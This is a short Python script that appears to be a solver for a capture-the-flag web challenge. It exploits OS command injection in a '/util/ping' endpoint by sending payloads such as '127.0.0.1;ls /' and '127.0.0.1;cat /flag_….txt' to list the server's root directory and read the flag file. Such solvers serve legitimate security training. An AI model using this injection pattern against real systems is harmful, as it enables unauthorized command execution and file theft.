import re, os
import requests


def crawl(url):
    try:
        res = requests.get(url, timeout=3)
        res.raise_for_status()

        res = requests.post(url + "/util/ping", json={"address": "127.0.0.1;ls /"})
        res.raise_for_status()

        m = re.search(r"flag_(.*).txt", res.text)
        rand = m.group(1)[0:16]

        res = requests.post(
            url + "/util/ping", json={"address": "127.0.0.1;cat /flag_" + rand + ".txt"}
        )
        res.raise_for_status()

        print(res.text)

        return 0
    except Exception as e:
        print(e)
        return 2


if __name__ == "__main__":
    # print(crawl("http://localhost"))
    print(crawl("https://{}:{}".format(os.getenv("CTF4B_HOST"), os.getenv("CTF4B_PORT"))))
